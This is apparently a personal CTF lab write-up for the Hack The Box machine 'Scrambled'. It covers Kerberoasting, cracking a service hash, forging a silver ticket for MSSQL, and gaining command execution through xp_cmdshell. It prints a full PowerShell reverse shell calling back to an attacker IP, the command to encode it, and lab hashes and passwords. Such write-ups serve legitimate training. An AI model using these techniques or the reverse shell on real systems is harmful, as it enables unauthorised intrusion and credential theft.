# Scrambled Helped Through

Name: Scrambled
Date:  5/12/2022
Difficulty:  Medium
Goals:  
- Have fun
- Enjoy a historic Cyber Security moment - Ippsec X Alh4zr3d 
- Thematic to becoming a Azure Admin cert
- OSCP Prep and continuation 
- Rebuild momentuum after a rough week
- More AD to add to Azure AD studies 
Learnt:
- NTLM is almost always never disabled in AD


## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](Screenshots/ping.png)

[Jazzpizazz](https://github.com/jazzpizazz/BloodHound.py-Kerberos) needs more love!

No NTLM, so no Pass the hash or NTLM relays and various tools using NTLM.
![](onlykerb.png)

There is sales orders app, please enable debug logging and reproduce the problem.
![](scrmcorpserv1.png)

Naming and Email Convention
![](nandemailconv.png)


Custom software on 4411
![](scrmcustom.png)

NTLM is normally enabled by default and is not really every disable because it breaks alot of AD. Al  spray with ksimpson:ksimpson and was successful, I really did not that would work and am presumming this a false positive. Sometimes this stuff is CTF reality.  

## Exploit

Objective: Get a Ticket

There are two formats for Kerberos Tickets - Impacket converts with `ticketConverter`
1. Ccach - Linux version
2. krbi - Windows

```bash
export KRB5CCNAME=$(pwd)/ksimpson.ccache # absolute or relative path 
sudo apt install krb5-user 
```

![](ticketsaved.png)

After taking a detour to try to make crackmapexec work with kerberos and updating my pass the ticket notes, given this is a helped-through check 0xdf learning that equivalence table would be really helpful. The equivilent required in this scenario where cme won't work need to enumerate share, but smbclient will also fail turn to impacket. 

```bash
impacket-smbclient -k scrm.local/ksimpson:ksimpson@dc1.scrm.local -dc-ip dc1.scrm.local

# help - will give commands
use $share # to enumerate shares
get # to download files
```

![](impacketsmbclient.png)
In the public share:
![](networksecuritychanges.png)

TIL:
5 minutes RTFM and pivoting to other tools  is better the melting your keyboard to your forehead
RID bruteforcing is NTLM authenication only! 
[Slack channels](https://www.youtube.com/watch?v=ePOjExrLj6M) is workplace messager and dashboard for colloberation use by some Red Teams - commands are always sanity checked before executed.

![](additionalsecnotes.png)

HR account may have access.

Feel very good that I did try to do my OSCP in this month all the AD tool are broken atleast 30 minutes debugging would be mental gridding.

![](kerberoasted.png)

Downloaded new impacket from github.
```
ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 16:32:02.351452  2022-12-10 17:24:58.075728
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 16:32:02.351452  2022-12-10 17:24:58.075728



$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$d76b741897933e935f952e70149e91ba$360719154af40fcce8eb0ee18bd9dc7ac2316eb9ccedab45040f06389fec6a5c52a2276e8625dbbdee1a1188b468d9319a9206a8779fc962a3033d2c6278d4dab420bee873ed05b7836c10183677f0b4d26a359b757a8892c612a51e8a95c2716f9ff54893a714cae471d917617b7669594d17ca95e55c3a44ff124208af533495a1a43faf15a73a1319c2b305eb57bef569eca3c1dc0bffcbaf0e565440e73d8fd9bbd751bf5d85636e5dba6e70a290f1860b0d8ed753cfe729ddf0f92541b6789ecc89beb06eb94f7ed68297644037b21d4d7a772e59884daf752b16c7ab39dae1623faab96c878b22cba88c0ad9da585973a053c2e1d21082f4228e345c296828bda7ea54dc2f54c1151e8580850cf5c1ac8863c8ffbdd331a8e7d450b8658ebc19ef0a7c9dd8d18578cafc6bcfae32dfcdeab57a1715f4f88f6bcdb7cf3a735525e873f0be19def35313c9d6391461e78516e7b2858734b941288420e48e17530dcba792b0b3ce31db783ccda2cbc977f469a8c769cb6d4dda8d3840a2d039a4e4c549de5e4aad6a0916c402791ef9f0c765390f19a39e32e93a09b60dfc6583b3451cb60818cb2b88e25babf0409085ff87d6ae88232f77a20d2ca1f53d9085088004826cd2f0875ad2f2b1d35b0e7960303a3cce86f3029b57524d684b852847168aaf8549097f7f228c75b6c111d82cb38c0a7fad63756fafc7da5e3f7a4e5d25d64a90e5b31d40332697e8c4e94fcb7d7819fce319459586697322052739159a79b2025249529c23ebbc10762712f6c6a0ca8e7d4912c8e3c4c401f33833deb70b968a5974c2bea4e12d48ff6606fdfe3fb72bb69eca5c5e2ff1158c00ff735648a9063b5819a62662b6424ed23192754f9fcbad8a427e0c26acb1eb46885014cd0cdd5b01cafb4818d82e66ed62c492a6afb27fd50ae10c8b737283137d17913d5c5eda80c502b7ec25dd605a09864428d52320a1745551ecc7f49a2d6f12725d865c09cac13ec4bb374811be531a1c16db16490eab824bd90dfb9308015bb4d7d88f78d4f978b80fc705052887abbd2b746c969409dff2a40bc483a5aa68dfed955dee6c5e58819e3a006b64ce9e8a2c051f18a21f4e5e3727ad7ffef560fd9aa012803e0bb25257394063f486e3db61cbb960f1dac197c2dccdf1dcb3d371e410ad2678645d5ab77d44bc1e642c1b69c57d840173cfc38a03e2e635284e55fd6463a57783c58a8d34a9554ad335407a0a0ba4b9bca80f42f589de35508b49bb02af97074e680202f4ff4f04ac9194251a2b383debd110e9b3f9936be61af9d2ee22fd84b2232fdd4aae83d6b28c987c5fcc4ee14f6ce5d7142a197d1cbfa09b56a773a7ce54421964762b013c6aa26cff75834d9cd6499eb54650c0a8d787608c62a49fa8b894385d0d5d263d8417e0a4f646966efd
```

`Pegasus60` - GPUs are expensive.

![](tgtforsqlsvc.png)

Because the sqlsvc is not a network administrator we can not access the mssql service.
```bash
export KRB5CCNAME=~$(pwd)/sqlsvc.ccache
```

But we have silver ticket from the using getTGT:
![](silverticketerino.png)

We need Domain SID; I tried enum4linux with both sets credential, which failed. getPac did not work for me, but this was due to how I had configured my /ect/hosts file

```bash
getPac.py -targetUser Administrator scrm.local/ksimpson:ksimpson
```

Domain SID: S-1-5-21-2743207045-1827831105-2542523200

Discovered: 
https://wadcoms.github.io/ - like LOLBAS or GTFObins is curated list of offensive security tools and their respective commands, to be used against Windows/AD environments.
https://codebeautify.org/ntlm-hash-generator - NTLM generator!

![](wowsantlm.png)

`Pegasus60 : B999A16500B87D17EC7F2E2A68778F05`

```bash
ticketer.py -nthash <krbtgt/service nthash> -domain-sid <your domain SID> -domain <your domain FQDN> baduser
```

Now with the fields, Remember the OBJECTIVES! We need Adminnistrator level access to access the mssql server.
```bash
ticketer.py -nthash B999A16500B87D17EC7F2E2A68778F05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -dc-ip 10.129.24.213 -spn MSSQLSvc/dc1.scrm.local Administrator
```

![](ticketingforsilver.png)

```bash
export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -no-pass -k scrm.local/Administrator@dc1.scrm.local
```

![](mssqlfoothold.png)
It was in fact not necessary to impersonate Administrator.

![](mssqlenuming.png)

Some of the command used above listed below
```sql
SELECT @@version					 	-- version check
SELECT DB_NAME()						-- current database
SELECT name FROM master..sysdatabases;	-- list databases

SELECT name, database_id, create_date FROM sys.databases;

USE ScrambleHR
SELECT * FROM information_schema.tables;
SELECT * FROM UserImport;
```

The Scrambled Eggs in the Database
![](ldappass.png)
`MiscSvc : ScrambledEggs9900`

![](enableandrunski.png)

We can get `systeminfo` from `xp_cmdshell`
```powershell
Host Name:                 DC1
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Primary Domain Controller
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00429-00521-62775-AA258
Original Install Date:     26/01/2020, 17:53:40
System Boot Time:          10/12/2022, 17:23:29
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2295 Mhz
                           [02]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2295 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-gb;English (United Kingdom)
Input Locale:              en-gb;English (United Kingdom)
Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,545 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 3,210 MB
Virtual Memory: In Use:    1,589 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    scrm.local
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.24.213
                                 [02]: fe80::5cf9:aac4:eb30:8f23
                                 [03]: dead:beef::5cf9:aac4:eb30:8f23
                                 [04]: dead:beef::116
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

```

Alh4zr3d's obfuscate reverse shell is just this with the variables changed
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.109',88);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

He then base64, lttle endians it: convert it to UTF-16LE, which the Windows Default encoding, encodes it to base64 then removes the newline .
```bash
iconv -f ASCII -t UTF-16LE $reverseshell.txt | base64 | tr -d "\n"
```


## Foothold

Then in MsSQL we then use `powershell -enc $outputFromComandAbove`
![](hurray.png)

We should always run `whoami /all or priv`
![](whoamiAll.png)

[JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG) and the [Blog](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)

3:07 - https://www.youtube.com/watch?v=-ulAAiUzQu0


## PrivEsc

## Beyond Root